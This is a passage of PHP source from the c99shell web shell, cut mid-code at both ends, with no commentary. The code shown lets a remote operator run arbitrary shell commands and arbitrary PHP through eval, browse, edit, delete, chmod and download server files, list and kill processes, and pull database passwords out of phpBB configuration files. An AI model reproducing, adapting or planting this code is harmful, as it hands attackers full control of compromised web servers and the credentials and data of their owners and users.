Command: <b>$execcmd</b></br>";\r\n  $olddir = realpath(".");\r\n  @chdir($d);\r\n  $ret = myshellexec($cmd);\r\n  $ret = convert_cyr_string($ret,"d","w");\r\n  if ($cmd_txt)\r\n  {\r\n   $rows = count(explode("\\r\\n",$ret))+1;\r\n   if ($rows < 10) {$rows = 10;}\r\n   echo "<br><textarea cols=\\"122\\" rows=\\"".$rows."\\" readonly>".htmlspecialchars($ret)."</textarea>";\r\n  }\r\n  else {echo $ret."<br>";}\r\n  @chdir($olddir);\r\n }\r\n else {echo "<b>Execution command</b>"; if (empty($cmd_txt)) {$cmd_txt = TRUE;}}\r\n echo "<form action=\\"".$surl."\\" method=POST><input type=hidden name=act value=cmd><textarea name=cmd cols=122 rows=10>".htmlspecialchars($cmd)."</textarea><input type=hidden name=\\"d\\" value=\\"".$dispd."\\"><br><br><input type=submit name=submit value=\\"Execute\\">&nbsp;Display in text-area&nbsp;<input type=\\"checkbox\\" name=\\"cmd_txt\\" value=\\"1\\""; if ($cmd_txt) {echo " checked";} echo "></form>";\r\n}\r\n}\r\nif ($act == "ls")\r\n{\r\n if (count($ls_arr) > 0) {$list = $ls_arr;}\r\n else\r\n {\r\n  $list = array();\r\n  if ($h = @opendir($d))\r\n  {\r\n   while (($o = readdir($h)) !== FALSE) {$list[] = $d.$o;}\r\n   closedir($h);\r\n  }\r\n  else {}\r\n }\r\n if (count($list) == 0) {echo "<center><b>Can\'t open folder ".htmlspecialchars($d)."</b></center>";}\r\n else\r\n {\r\n  //Building array\r\n  $objects = array();\r\n  $vd = "f"; //Viewing mode\r\n  if ($vd == "f")\r\n  {\r\n   $objects["head"] = array();\r\n   $objects["folders"] = array();\r\n   $objects["links"] = array();\r\n   $objects["files"] = array();\r\n   foreach ($list as $v)\r\n   {\r\n    $o = basename($v);\r\n    $row = array();\r\n    if ($o == ".") {$row[] = $d.$o; $row[] = "LINK";}\r\n    elseif ($o == "..") {$row[] = $d.$o; $row[] = "LINK";}\r\n    elseif (is_dir($v))\r\n    {\r\n     if (is_link($v)) {$type = "LINK";}\r\n     else {$type = "DIR";}\r\n     $row[] = $v;\r\n     $row[] = $type;\r\n    }\r\n    elseif(is_file($v)) {$row[] = $v; $row[] = filesize($v);}\r\n    $row[] = filemtime($v);\r\n    if (!$win)\r\n    {\r\n     $ow = posix_getpwuid(fileowner($v));\r\n     $gr = posix_getgrgid(filegroup($v));\r\n     $row[] = ($ow["name"]?$ow["name"]:fileowner($v))."/".($gr["name"]?$gr["name"]:filegroup($v));\r\n    }\r\n    $row[] = fileperms($v);\r\n    if (($o == ".") or ($o == "..")) {$objects["head"][] = $row;}\r\n    elseif (is_link($v)) {$objects["links"][] = $row;}\r\n    elseif (is_dir($v)) {$objects["folders"][] = $row;}\r\n    elseif (is_file($v)) {$objects["files"][] = $row;}\r\n    $i++;\r\n   }\r\n   $row = array();\r\n   $row[] = "<b>Name</b>";\r\n   $row[] = "<b>Size</b>";\r\n   $row[] = "<b>Modify</b>";\r\n   if (!$win)\r\n  {$row[] = "<b>Owner/Group</b>";}\r\n   $row[] = "<b>Perms</b>";\r\n   $row[] = "<b>Action</b>";\r\n   $parsesort = parsesort($sort);\r\n   $sort = $parsesort[0].$parsesort[1];\r\n   $k = $parsesort[0];\r\n   if ($parsesort[1] != "a") {$parsesort[1] = "d";}\r\n   $y = "<a href=\\"".$surl."act=".$dspact."&d=".urlencode($d)."&sort=".$k.($parsesort[1] == "a"?"d":"a")."\\">";\r\n   $y .= "[Sort-".($parsesort[1] == "a"?"Asc.":"Desc")."]</a>";\r\n   $row[$k] .= $y;\r\n   for($i=0;$i<count($row)-1;$i++)\r\n   {\r\n    if ($i != $k) {$row[$i] = "<a href=\\"".$surl."act=".$dspact."&d=".urlencode($d)."&sort=".$i.$parsesort[1]."\\">".$row[$i]."</a>";}\r\n   }\r\n   $v = $parsesort[0];\r\n   usort($objects["folders"], "tabsort");\r\n   usort($objects["links"], "tabsort");\r\n   usort($objects["files"], "tabsort");\r\n   if ($parsesort[1] == "d")\r\n   {\r\n    $objects["folders"] = array_reverse($objects["folders"]);\r\n    $objects["files"] = array_reverse($objects["files"]);\r\n   }\r\n   $objects = array_merge($objects["head"],$objects["folders"],$objects["links"],$objects["files"]);\r\n   $tab = array();\r\n   $tab["cols"] = array($row);\r\n   $tab["head"] = array();\r\n   $tab["folders"] = array();\r\n   $tab["links"] = array();\r\n   $tab["files"] = array();\r\n   $i = 0;\r\n   foreach ($objects as $a)\r\n   {\r\n    $v = $a[0];\r\n    $o = basename($v);\r\n    $dir = dirname($v);\r\n    if ($disp_fullpath) {$disppath = $v;}\r\n    else {$disppath = $o;}\r\n    $disppath = str2mini($disppath,60);\r\n    if (in_array($v,$sess_data["cut"])) {$disppath = "<strike>".$disppath."</strike>";}\r\n    elseif (in_array($v,$sess_data["copy"])) {$disppath = "<u>".$disppath."</u>";}\r\n    foreach ($regxp_highlight as $r)\r\n    {\r\n     if (ereg($r[0],$o))\r\n     {\r\n      if ((!is_numeric($r[1])) or ($r[1] > 3)) {$r[1] = 0; ob_clean(); echo "Warning! Configuration error in \\$regxp_highlight[".$k."][0] - unknown command."; c99shexit();}\r\n      else\r\n      {\r\n       $r[1] = round($r[1]);\r\n       $isdir = is_dir($v);\r\n       if (($r[1] == 0) or (($r[1] == 1) and !$isdir) or (($r[1] == 2) and !$isdir))\r\n       {\r\n        if (empty($r[2])) {$r[2] = "<b>"; $r[3] = "</b>";}\r\n        $disppath = $r[2].$disppath.$r[3];\r\n        if ($r[4]) {break;}\r\n       }\r\n      }\r\n     }\r\n    }\r\n    $uo = urlencode($o);\r\n    $ud = urlencode($dir);\r\n    $uv = urlencode($v);\r\n    $row = array();\r\n    if ($o == ".")\r\n    {\r\n     $row[] = "&nbsp;<a href=\\"".$surl."act=".$dspact."&d=".urlencode(realpath($d.$o))."&sort=".$sort."\\">".$o."</a>";\r\n     $row[] = "LINK";\r\n    }\r\n    elseif ($o == "..")\r\n    {\r\n     $row[] = "&nbsp;<a href=\\"".$surl."act=".$dspact."&d=".urlencode(realpath($d.$o))."&sort=".$sort."\\">".$o."</a>";\r\n     $row[] = "LINK";\r\n    }\r\n    elseif (is_dir($v))\r\n    {\r\n     if (is_link($v))\r\n     {\r\n      $disppath .= " => ".readlink($v);\r\n      $type = "LINK";\r\n      $row[] =  "&nbsp;<a href=\\"".$surl."act=ls&d=".$uv."&sort=".$sort."\\">[".$disppath."]</a>";\r\n     }\r\n     else\r\n     {\r\n      $type = "DIR";\r\n      $row[] =  "&nbsp;<a href=\\"".$surl."act=ls&d=".$uv."&sort=".$sort."\\">[".$disppath."]</a>";\r\n      }\r\n     $row[] = $type;\r\n    }\r\n    elseif(is_file($v))\r\n    {\r\n     $ext = explode(".",$o);\r\n     $c = count($ext)-1;\r\n     $ext = $ext[$c];\r\n     $ext = strtolower($ext);\r\n     $row[] =  "&nbsp;<a href=\\"".$surl."act=f&f=".$uo."&d=".$ud."&\\">".$disppath."</a>";\r\n     $row[] = view_size($a[1]);\r\n    }\r\n    $row[] = date("d.m.Y H:i:s",$a[2]);\r\n    if (!$win) {$row[] = $a[3];}\r\n    $row[] = "<a href=\\"".$surl."act=chmod&f=".$uo."&d=".$ud."\\"><b>".view_perms_color($v)."</b></a>";\r\n    if ($o == ".") {$checkbox = "<input type=\\"checkbox\\" name=\\"actbox[]\\" onclick=\\"ls_reverse_all();\\">"; $i--;}\r\n    else {$checkbox = "<input type=\\"checkbox\\" name=\\"actbox[]\\" id=\\"actbox".$i."\\" value=\\"".htmlspecialchars($v)."\\">";}\r\n    if (is_dir($v)) {$row[] = "<a href=\\"".$surl."act=d&d=".$uv."\\">[Info]</a>&nbsp;".$checkbox;}\r\n    else {$row[] = "<a href=\\"".$surl."act=f&f=".$uo."&ft=info&d=".$ud."\\">[Info]</a>&nbsp;<a href=\\"".$surl."act=f&f=".$uo."&ft=edit&d=".$ud."\\">[Change]</a>&nbsp;<a href=\\"".$surl."act=f&f=".$uo."&ft=download&d=".$ud."\\">[Download]</a>&nbsp;".$checkbox;}\r\n    if (($o == ".") or ($o == "..")) {$tab["head"][] = $row;}\r\n    elseif (is_link($v)) {$tab["links"][] = $row;}\r\n    elseif (is_dir($v)) {$tab["folders"][] = $row;}\r\n    elseif (is_file($v)) {$tab["files"][] = $row;}\r\n    $i++;\r\n   }\r\n  }\r\n  // Compiling table\r\n  $table = array_merge($tab["cols"],$tab["head"],$tab["folders"],$tab["links"],$tab["files"]);\r\n  echo "<center><b><u>Listing Folder: ".count($tab["files"])." files and ".(count($tab["folders"])+count($tab["links"]))." folders</u></b></center><br><TABLE cellSpacing=0 cellPadding=0 width=100% bgColor=#333333 borderColorLight=#433333 border=0><form action=\\"".$surl."\\" method=POST name=\\"ls_form\\"><input type=hidden name=act value=".$dspact."><input type=hidden name=d value=".$d.">";\r\n  foreach($table as $row)\r\n  {\r\n   echo "<tr>\\r\\n";\r\n   foreach($row as $v) {echo "<td>".$v."</td>\\r\\n";}\r\n   echo "</tr>\\r\\n";\r\n  }\r\n  echo "</table><hr size=\\"1\\" noshade><p align=\\"right\\">\r\n  <script>\r\n  function ls_setcheckboxall(status)\r\n  {\r\n   var id = 1;\r\n   var num = ".(count($table)-2).";\r\n   while (id <= num)\r\n   {\r\n    document.getElementById(\'actbox\'+id).checked = status;\r\n    id++;\r\n   }\r\n  }\r\n  function ls_reverse_all()\r\n  {\r\n   var id = 1;\r\n   var num = ".(count($table)-2).";\r\n   while (id <= num)\r\n   {\r\n    document.getElementById(\'actbox\'+id).checked = !document.getElementById(\'actbox\'+id).checked;\r\n    id++;\r\n   }\r\n  }\r\n  </script>\r\n  <input type=\\"button\\" onclick=\\"ls_setcheckboxall(true);\\" value=\\"Select all\\">&nbsp;&nbsp;<input type=\\"button\\" onclick=\\"ls_setcheckboxall(false);\\" value=\\"Unselect all\\"> \r\n  <b>";\r\n  if (count(array_merge($sess_data["copy"],$sess_data["cut"])) > 0 and ($usefsbuff))\r\n  {\r\n   echo "<input type=submit name=actarcbuff value=\\"Pack buffer to archive\\">&nbsp;<input type=\\"text\\" name=\\"actarcbuff_path\\" value=\\"archive_".substr(md5(rand(1,1000).rand(1,1000)),0,5).".tar.gz\\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type=submit name=\\"actpastebuff\\" value=\\"Paste\\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type=submit name=\\"actemptybuff\\" value=\\"Empty buffer\\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";\r\n  }\r\n  echo "<select name=act><option value=\\"".$act."\\">With selected:</option>";\r\n  echo "<option value=delete".($dspact == "delete"?" selected":"").">Delete</option>";\r\n  echo "<option value=chmod".($dspact == "chmod"?" selected":"").">Change-mode</option>";\r\n  if ($usefsbuff)\r\n  {\r\n   echo "<option value=cut".($dspact == "cut"?" selected":"").">Cut</option>";\r\n   echo "<option value=copy".($dspact == "copy"?" selected":"").">Copy</option>";\r\n   echo "<option value=unselect".($dspact == "unselect"?" selected":"").">Unselect</option>";\r\n  }\r\n  echo "</select>&nbsp;<input type=submit value=\\"Confirm\\"></p>";\r\n  echo "</form>";\r\n }\r\n}\r\n\r\nif ($act == "processes")\r\n{\r\n echo "<b>Processes:</b><br>";\r\n if (!$win) {$handler = "ps aux".($grep?" | grep \'".addslashes($grep)."\'":"");}\r\n else {$handler = "tasklist";}\r\n $ret = myshellexec($handler);\r\n if (!$ret) {echo "</br>Can\'t execute \\"".$handler."\\"!";}\r\n else\r\n {\r\n  if (empty($processes_sort)) {$processes_sort = $sort_default;}\r\n  $parsesort = parsesort($processes_sort);\r\n  if (!is_numeric($parsesort[0])) {$parsesort[0] = 0;}\r\n  $k = $parsesort[0];\r\n  if ($parsesort[1] != "a") {$y = "<a href=\\"".$surl."act=".$dspact."&d=".urlencode($d)."&processes_sort=".$k."a\\">[sort_desc]</a>";}\r\n  else {$y = "<a href=\\"".$surl."act=".$dspact."&d=".urlencode($d)."&processes_sort=".$k."d\\">[sort_asc]</a>";}\r\n  $ret = htmlspecialchars($ret);\r\n  if (!$win)\r\n  {\r\n   if ($pid)\r\n   {\r\n    if (is_null($sig)) {$sig = 9;}\r\n    echo "Sending signal ".$sig." to #".$pid."... ";\r\n    if (posix_kill($pid,$sig)) {echo "OK.";}\r\n    else {echo "ERROR.";}\r\n   }\r\n   while (ereg("  ",$ret)) {$ret = str_replace("  "," ",$ret);}\r\n   $stack = explode("\\n",$ret);\r\n   $head = explode(" ",$stack[0]);\r\n   unset($stack[0]);\r\n   for($i=0;$i<count($head);$i++)\r\n   {\r\n    if ($i != $k) {$head[$i] = "<a href=\\"".$surl."act=".$dspact."&d=".urlencode($d)."&processes_sort=".$i.$parsesort[1]."\\"><b>".$head[$i]."</b></a>";}\r\n   }\r\n   $prcs = array();\r\n   foreach ($stack as $line)\r\n   {\r\n    if (!empty($line))\r\n{\r\n echo "<tr>";\r\n     $line = explode(" ",$line);\r\n     $line[10] = join(" ",array_slice($line,10));\r\n     $line = array_slice($line,0,11);\r\n     if ($line[0] == get_current_user()) {$line[0] = "<font color=green>".$line[0]."</font>";}\r\n     $line[] = "<a href=\\"".$surl."act=processes&d=".urlencode($d)."&pid=".$line[1]."&sig=9\\"><u>KILL</u></a>";\r\n     $prcs[] = $line;\r\n     echo "</tr>";\r\n    }\r\n   }\r\n  }\r\n  else\r\n  {\r\n   while (ereg("  ",$ret)) {$ret = str_replace("  ","",$ret);}\r\n   while (ereg("  ",$ret)) {$ret = str_replace("  ","",$ret);}\r\n   while (ereg("  ",$ret)) {$ret = str_replace("  ","",$ret);}\r\n   while (ereg("  ",$ret)) {$ret = str_replace("  ","",$ret);}\r\n   while (ereg("  ",$ret)) {$ret = str_replace("  ","",$ret);}\r\n   while (ereg("  ",$ret)) {$ret = str_replace("  ","",$ret);}\r\n   while (ereg("  ",$ret)) {$ret = str_replace("  ","",$ret);}\r\n   while (ereg("  ",$ret)) {$ret = str_replace("  ","",$ret);}\r\n   while (ereg("  ",$ret)) {$ret = str_replace("  ","",$ret);}\r\n   while (ereg("",$ret)) {$ret = str_replace("","",$ret);}\r\n   while (ereg(" ",$ret)) {$ret = str_replace(" ","",$ret);}\r\n   $ret = convert_cyr_string($ret,"d","w");\r\n   $stack = explode("\\n",$ret);\r\n   unset($stack[0],$stack[2]);\r\n   $stack = array_values($stack);\r\n   $head = explode("",$stack[0]);\r\n   $head[1] = explode(" ",$head[1]);\r\n   $head[1] = $head[1][0];\r\n   $stack = array_slice($stack,1);\r\n   unset($head[2]);\r\n   $head = array_values($head);\r\n   if ($parsesort[1] != "a") {$y = "<a href=\\"".$surl."act=".$dspact."&d=".urlencode($d)."&processes_sort=".$k."a\\">[sort_desc]</a>";}\r\n   else {$y = "<a href=\\"".$surl."act=".$dspact."&d=".urlencode($d)."&processes_sort=".$k."d\\">[sort_asc]</a>";}\r\n   if ($k > count($head)) {$k = count($head)-1;}\r\n   for($i=0;$i<count($head);$i++)\r\n   {\r\n    if ($i != $k) {$head[$i] = "<a href=\\"".$surl."act=".$dspact."&d=".urlencode($d)."&processes_sort=".$i.$parsesort[1]."\\"><b>".trim($head[$i])."</b></a>";}\r\n   }\r\n   $prcs = array();\r\n   foreach ($stack as $line)\r\n   {\r\n    if (!empty($line))\r\n    {\r\n     echo "<tr>";\r\n     $line = explode("",$line);\r\n     $line[1] = intval($line[1]); $line[2] = $line[3]; unset($line[3]);\r\n     $line[2] = intval(str_replace(" ","",$line[2]))*1024; \r\n     $prcs[] = $line;\r\n     echo "</tr>";\r\n    }\r\n   }\r\n  }\r\n  $head[$k] = "<b>".$head[$k]."</b>".$y;\r\n  $v = $processes_sort[0];\r\n  usort($prcs,"tabsort");\r\n  if ($processes_sort[1] == "d") {$prcs = array_reverse($prcs);}\r\n  $tab = array();\r\n  $tab[] = $head;\r\n  $tab = array_merge($tab,$prcs);\r\n  echo "<TABLE height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\\"100%\\" bgColor=#333333 borderColorLight=#c0c0c0 border=1 bordercolor=\\"#C0C0C0\\">";\r\n  foreach($tab as $i=>$k)\r\n  {\r\n   echo "<tr>";\r\n   foreach($k as $j=>$v) {if ($win and $i > 0 and $j == 2) {$v = view_size($v);} echo "<td>".$v."</td>";}\r\n   echo "</tr>";\r\n  }\r\n  echo "</table>";\r\n }\r\n}\r\nif ($act == "eval")\r\n{\r\n if (!empty($eval))\r\n {\r\n  echo "<b>Result of execution this PHP-code</b>:<br>";\r\n  $tmp = ob_get_contents();\r\n  $olddir = realpath(".");\r\n  @chdir($d);\r\n  if ($tmp)\r\n  {\r\n   ob_clean();\r\n   eval($eval);\r\n   $ret = ob_get_contents();\r\n   $ret = convert_cyr_string($ret,"d","w");\r\n   ob_clean();\r\n   echo $tmp;\r\n   if ($eval_txt)\r\n   {\r\n    $rows = count(explode("\\r\\n",$ret))+1;\r\n    if ($rows < 10) {$rows = 10;}\r\n    echo "<br><textarea cols=\\"122\\" rows=\\"".$rows."\\" readonly>".htmlspecialchars($ret)."</textarea>";\r\n   }\r\n   else {echo $ret."<br>";}\r\n  }\r\n  else\r\n  {\r\n   if ($eval_txt)\r\n   {\r\n    echo "<br><textarea cols=\\"122\\" rows=\\"15\\" readonly>";\r\n    eval($eval);\r\n    echo "</textarea>";\r\n   }\r\n   else {echo $ret;}\r\n  }\r\n  @chdir($olddir);\r\n }\r\n else {echo "<b>Execution PHP-code</b>"; if (empty($eval_txt)) {$eval_txt = TRUE;}}\r\n echo "<form action=\\"".$surl."\\" method=POST><input type=hidden name=act value=eval><textarea name=\\"eval\\" cols=\\"122\\" rows=\\"10\\">".htmlspecialchars($eval)."</textarea><input type=hidden name=\\"d\\" value=\\"".$dispd."\\"><br><br><input type=submit value=\\"Execute\\">&nbsp;Display in text-area&nbsp;<input type=\\"checkbox\\" name=\\"eval_txt\\" value=\\"1\\""; if ($eval_txt) {echo " checked";} echo "></form>";\r\n}\r\nif ($act == "f")\r\n{\r\n if ((!is_readable($d.$f) or is_dir($d.$f)) and $ft != "edit")\r\n {\r\n  if (file_exists($d.$f)) {echo "<center><b>Permision denied (".htmlspecialchars($d.$f).")!</b></center>";}\r\n  else {echo "<center><b>File does not exists (".htmlspecialchars($d.$f).")!</b><br><a href=\\"".$surl."act=f&f=".urlencode($f)."&ft=edit&d=".urlencode($d)."&c=1\\"><u>Create</u></a></center>";}\r\n }\r\n else\r\n {\r\n  $r = @file_get_contents($d.$f);\r\n  $ext = explode(".",$f);\r\n  $c = count($ext)-1;\r\n  $ext = $ext[$c];\r\n  $ext = strtolower($ext);\r\n  $rft = "";\r\n  foreach($ftypes as $k=>$v) {if (in_array($ext,$v)) {$rft = $k; break;}}\r\n  if (eregi("sess_(.*)",$f)) {$rft = "phpsess";}\r\n  if (empty($ft)) {$ft = $rft;}\r\n  $arr = array(\r\n   array("[hex]","info"),\r\n   array("[html]","html"),\r\n   array("[txt]","txt"),\r\n   array("[Code]","code"),\r\n   array("[Session]","phpsess"),\r\n   array("[exe]","exe"),\r\n   array("[SDB]","sdb"),\r\n   array("[gif]","img"),\r\n   array("[ini]","ini"),\r\n   array("[download]","download"),\r\n   array("[rtf]","notepad"),\r\n   array("[change]","edit")\r\n  );\r\n  echo "<b>Viewing file:&nbsp;&nbsp;&nbsp;&nbsp;[$ext]&nbsp;".$f." (".view_size(filesize($d.$f)).") &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;".view_perms_color($d.$f)."</b><br>Select action/file-type:<br>";\r\n  foreach($arr as $t)\r\n  {\r\n   if ($t[1] == $rft) {echo " <a href=\\"".$surl."act=f&f=".urlencode($f)."&ft=".$t[1]."&d=".urlencode($d)."\\"><font color=green>".$t[0]."</font></a>";}\r\n   elseif ($t[1] == $ft) {echo " <a href=\\"".$surl."act=f&f=".urlencode($f)."&ft=".$t[1]."&d=".urlencode($d)."\\"><b><u>".$t[0]."</u></b></a>";}\r\n   else {echo " <a href=\\"".$surl."act=f&f=".urlencode($f)."&ft=".$t[1]."&d=".urlencode($d)."\\"><b>".$t[0]."</b></a>";}\r\n   echo " (<a href=\\"".$surl."act=f&f=".urlencode($f)."&ft=".$t[1]."&white=1&d=".urlencode($d)."\\" target=\\"_blank\\">+</a>) |";\r\n  }\r\n  echo "<hr size=\\"1\\" noshade>";\r\n  if ($ft == "info")\r\n  {\r\n   echo "<b>Information:</b><table border=0 cellspacing=1 cellpadding=2><tr><td><b>Path</b></td><td> ".$d.$f."</td></tr><tr><td><b>Size</b></td><td> ".view_size(filesize($d.$f))."</td></tr><tr><td><b>MD5</b></td><td> ".md5_file($d.$f)."</td></tr>";\r\n   if (!$win)\r\n   {\r\n    echo "<tr><td><b>Owner/Group</b></td><td> ";    \r\n    $ow = posix_getpwuid(fileowner($d.$f));\r\n    $gr = posix_getgrgid(filegroup($d.$f));\r\n    echo ($ow["name"]?$ow["name"]:fileowner($d.$f))."/".($gr["name"]?$gr["name"]:filegroup($d.$f));\r\n   }\r\n   echo "<tr><td><b>Perms</b></td><td><a href=\\"".$surl."act=chmod&f=".urlencode($f)."&d=".urlencode($d)."\\">".view_perms_color($d.$f)."</a></td></tr><tr><td><b>Create time</b></td><td> ".date("d/m/Y H:i:s",filectime($d.$f))."</td></tr><tr><td><b>Access time</b></td><td> ".date("d/m/Y H:i:s",fileatime($d.$f))."</td></tr><tr><td><b>MODIFY time</b></td><td> ".date("d/m/Y H:i:s",filemtime($d.$f))."</td></tr></table><br>";\r\n   $fi = fopen($d.$f,"rb");\r\n   if ($fi)\r\n   {\r\n    if ($fullhexdump) {echo "<b>FULL HEXDUMP</b>"; $str = fread($fi,filesize($d.$f));}\r\n    else {echo "<b>HEXDUMP PREVIEW</b>"; $str = fread($fi,$hexdump_lines*$hexdump_rows);}\r\n    $n = 0;\r\n    $a0 = "00000000<br>";\r\n    $a1 = "";\r\n    $a2 = "";\r\n    for ($i=0; $i<strlen($str); $i++)\r\n    {\r\n     $a1 .= sprintf("%02X",ord($str[$i]))." ";\r\n     switch (ord($str[$i]))\r\n     {\r\n      case 0:  $a2 .= "<font>0</font>"; break;\r\n      case 32:\r\n      case 10:\r\n      case 13: $a2 .= "&nbsp;"; break;\r\n      default: $a2 .= htmlspecialchars($str[$i]);\r\n     }\r\n     $n++;\r\n     if ($n == $hexdump_rows)\r\n     {\r\n      $n = 0;\r\n      if ($i+1 < strlen($str)) {$a0 .= sprintf("%08X",$i+1)."<br>";}\r\n      $a1 .= "<br>";\r\n      $a2 .= "<br>";\r\n     }\r\n    }\r\n    //if ($a1 != "") {$a0 .= sprintf("%08X",$i)."<br>";}\r\n    echo "<table border=0 bgcolor=#666666 cellspacing=1 cellpadding=4><tr><td bgcolor=#666666>".$a0."</td><td bgcolor=000000>".$a1."</td><td bgcolor=000000>".$a2."</td></tr></table><br>";\r\n   }\r\n   $encoded = "";\r\n   if ($base64 == 1)\r\n   {\r\n    echo "<b>Base64 Encode</b><br>";\r\n    $encoded = base64_encode(file_get_contents($d.$f));\r\n   }\r\n   elseif($base64 == 2)\r\n   {\r\n    echo "<b>Base64 Encode + Chunk</b><br>";\r\n    $encoded = chunk_split(base64_encode(file_get_contents($d.$f)));\r\n   }\r\n   elseif($base64 == 3)\r\n   {\r\n    echo "<b>Base64 Encode + Chunk + Quotes</b><br>";\r\n    $encoded = base64_encode(file_get_contents($d.$f));\r\n    $encoded = substr(preg_replace("!.{1,76}!","\'\\\\0\'.\\n",$encoded),0,-2);\r\n   }\r\n   elseif($base64 == 4)\r\n   {\r\n    $text = file_get_contents($d.$f);\r\n    $encoded = base64_decode($text);\r\n    echo "<b>Base64 Decode";\r\n    if (base64_encode($encoded) != $text) {echo " (failed)";}\r\n    echo "</b><br>";\r\n   }\r\n   if (!empty($encoded))\r\n   {\r\n    echo "<textarea cols=80 rows=10>".htmlspecialchars($encoded)."</textarea><br><br>";\r\n   }\r\n   echo "<b>HEXDUMP:</b><nobr> [<a href=\\"".$surl."act=f&f=".urlencode($f)."&ft=info&fullhexdump=1&d=".urlencode($d)."\\">Full</a>] [<a href=\\"".$surl."act=f&f=".urlencode($f)."&ft=info&d=".urlencode($d)."\\">Preview</a>]<br><b>Base64: </b>\r\n<nobr>[<a href=\\"".$surl."act=f&f=".urlencode($f)."&ft=info&base64=1&d=".urlencode($d)."\\">Encode</a>]&nbsp;</nobr>\r\n<nobr>[<a href=\\"".$surl."act=f&f=".urlencode($f)."&ft=info&base64=2&d=".urlencode($d)."\\">+chunk</a>]&nbsp;</nobr>\r\n<nobr>[<a href=\\"".$surl."act=f&f=".urlencode($f)."&ft=info&base64=3&d=".urlencode($d)."\\">+chunk+quotes</a>]&nbsp;</nobr>\r\n<nobr>[<a href=\\"".$surl."act=f&f=".urlencode($f)."&ft=info&base64=4&d=".urlencode($d)."\\">Decode</a>]&nbsp;</nobr>\r\n<P>";\r\n  }\r\n  elseif ($ft == "html")\r\n  {\r\n   if ($white) {@ob_clean();}\r\n   echo $r;\r\n   if ($white) {c99shexit();}\r\n  }\r\n  elseif ($ft == "txt") {echo "<pre>".htmlspecialchars($r)."</pre>";}\r\n  elseif ($ft == "ini") {echo "<pre>"; var_dump(parse_ini_file($d.$f,TRUE)); echo "</pre>";}\r\n  elseif ($ft == "phpsess")\r\n  {\r\n   echo "<pre>";\r\n   $v = explode("|",$r);\r\n   echo $v[0]."<br>";\r\n   var_dump(unserialize($v[1]));\r\n   echo "</pre>";\r\n  }\r\n  elseif ($ft == "exe")\r\n  {\r\n   $ext = explode(".",$f);\r\n   $c = count($ext)-1;\r\n   $ext = $ext[$c];\r\n   $ext = strtolower($ext);\r\n   $rft = "";\r\n   foreach($exeftypes as $k=>$v)\r\n   {\r\n    if (in_array($ext,$v)) {$rft = $k; break;}\r\n   }\r\n   $cmd = str_replace("%f%",$f,$rft);\r\n   echo "<b>Execute file:</b><form action=\\"".$surl."\\" method=POST><input type=hidden name=act value=cmd><input type=\\"text\\" name=\\"cmd\\" value=\\"".htmlspecialchars($cmd)."\\" size=\\"".(strlen($cmd)+2)."\\"><br>Display in text-area<input type=\\"checkbox\\" name=\\"cmd_txt\\" value=\\"1\\" checked><input type=hidden name=\\"d\\" value=\\"".htmlspecialchars($d)."\\"><br><input type=submit name=submit value=\\"Execute\\"></form>";\r\n  }\r\n  elseif ($ft == "sdb") {echo "<pre>"; var_dump(unserialize(base64_decode($r))); echo "</pre>";}\r\n  elseif ($ft == "code")\r\n  {\r\n   if (ereg("php"."BB 2.(.*) auto-generated config file",$r))\r\n   {\r\n    $arr = explode("\\n",$r);\r\n    if (count($arr == 18))\r\n    {\r\n     include($d.$f);\r\n     echo "<b>phpBB configuration is detected in this file!<br>";\r\n     if ($dbms == "mysql4") {$dbms = "mysql";}\r\n     if ($dbms == "mysql") {echo "<a href=\\"".$surl."act=sql&sql_server=".htmlspecialchars($dbhost)."&sql_login=".htmlspecialchars($dbuser)."&sql_passwd=".htmlspecialchars($dbpasswd)."&sql_port=3306&sql_db=".htmlspecialchars($dbname)."\\"><b><u>Connect to DB</u></b></a><br><br>";}\r\n     else {echo "But, you can\'t connect to forum sql-base, because db-software=\\"".$dbms."\\" is not supported by c99shell. Please, report us for fix.";}\r\n     echo "Parameters for manual connect:<br>";\r\n     $cfgvars = array("dbms"=>$dbms,"dbhost"=>$dbhost,"dbname"=>$dbname,"dbuser"=>$dbuser,"dbpasswd"=>$dbpasswd);\r\n     foreach ($cfgvars as $k=>$v) {echo htmlspecialchars($k)."=\'".htmlspecialchars($v)."\'<br>";}\r\n     echo "</b><hr size=\\"1\\" noshade>";\r\n    }\r\n   }\r\n   echo "<div style=\\"border : 0px solid #FFFFFF; padding: 1em; margin-top: 1em; margin-bottom: 1em; margin-right: 1em; margin-left: 1em; background-color: ".$highlight_background .";\\">";\r\n   if (!empty($white)) {@ob_clean();}\r\n   highlight_file($d.$f);\r\n   if (!empty($white)) {c99shexit();}\r\n   echo "</div>";\r\n  }\r\n  elseif ($ft == "download")\r\n  {\r\n   @ob_clean();\r\n   header("Content-type: application/octet-stream");\r\n   header("Content-length: ".filesize($d.$f));\r\n   header("Content-disposition: attachment; filename=\\"".$f."\\";");\r\n   echo $r;\r\n   exit;\r\n  }\r\n  elseif ($ft == "notepad")\r\n  {\r\n   @ob_clean();\r\n   header("Content-type: text/plain");\r\n   header("Content-disposition: attachment; filename=\\"".$f.".txt\\";");\r\n   echo($r);\r\n   exit;\r\n  }\r\n  elseif ($ft == "img")\r\n  {\r\n   $inf = getimagesize($d.$f);\r\n   if (!$white)\r\n   {\r\n    if (empty($imgsize)) {$imgsize = 20;}\r\n    $width = $inf[0]/100*$imgsize;\r\n    $height = $inf[1]/100*$imgsize;\r\n    echo "<center><b>Size:</b>&nbsp;";\r\n    $sizes = array("100","50","20");\r\n    foreach ($sizes as $v)\r\n    {\r\n     echo "<a href=\\"".$surl."act=f&f=".urlencode($f)."&ft=img&d=".urlencode($d)."&imgsize=".$v."\\">";\r\n     if ($imgsize != $v ) {echo $v;}\r\n     else {echo "<u>".$v."</u>";}\r\n     echo "</a>&nbsp;&nbsp;&nbsp;";\r\n    }\r\n    echo "<br><br><img src=\\"".$surl."act=f&f=".urlencode($f)."&ft=img&white=1&d=".urlencode($d)."\\" width=\\"".$width."\\" height=\\"".$height."\\" border=\\"1\\"></center>";\r\n   }\r\n   else\r\n   {\r\n    @ob_clean();\r\n    $ext = explode($f,".");\r\n    $ext = $ext[count($ext)-1];\r\n    header("Content-type: ".$inf["mime"]);\r\n    readfile($d.$f);\r\n    exit;\r\n   }\r\n  }\r\n  elseif ($ft == "edit")\r\n  {\r\n   if (!empty($submit))\r\n   {\r\n    if 